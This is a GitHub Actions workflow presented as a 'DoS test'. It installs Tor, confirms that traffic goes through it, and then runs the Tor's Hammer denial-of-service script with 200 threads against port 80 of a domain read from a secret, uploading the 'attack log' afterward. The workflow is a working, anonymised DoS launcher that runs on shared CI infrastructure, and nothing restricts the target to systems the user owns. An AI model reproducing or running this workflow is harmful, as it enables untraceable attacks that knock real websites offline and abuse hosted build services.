name: Tor's Hammer DoS Test

on:
  workflow_dispatch:  # Manual trigger only (safer)

environment:
  name: dos-test
  url: https://github.com

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    environment: dos-test  # Links to environment + secrets

    steps:
    - name: Checkout code
      uses: actions/checkout@v4

    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.x'

    - name: Install dependencies
      run: |
        pip install pysocks requests
        sudo apt-get update -qq
        sudo apt-get install -y tor

    - name: Start Tor
      run: |
        sudo service tor start
        echo "Waiting 10s for Tor to connect..."
        sleep 10
        curl --socks5-hostname 127.0.0.1:9050 -s https://check.torproject.org/api/ip | grep -q '"IsTor":true' && echo "Tor is ACTIVE!" || echo "Tor failed to connect."

    - name: Run Tor's Hammer
      env:
        TARGET: ${{ secrets.TEST_TARGET }}  # Correct way to read environment secret
      run: |
        if [ -z "$TARGET" ]; then
          echo "ERROR: TEST_TARGET not set in 'dos-test' environment!"
          echo "Go to: Settings > Environments > dos-test > Add secret: TEST_TARGET = yourdomain.com"
          exit 1
        fi

        echo "Starting attack on $TARGET:80 with 200 threads via Tor..."
        python3 torshammer.py -s "$TARGET" -p 80 -r 200 -T > hammer-attack.log 2>&1 || true

        echo "Attack finished. Full log:"
        cat hammer-attack.log || echo "No log output."

    - name: Upload Attack Log
      if: always()
      uses: actions/upload-artifact@v4
      with:
        name: torshammer-attack-log-${{ github.run_number }}
        path: hammer-attack.log
        retention-days: 7
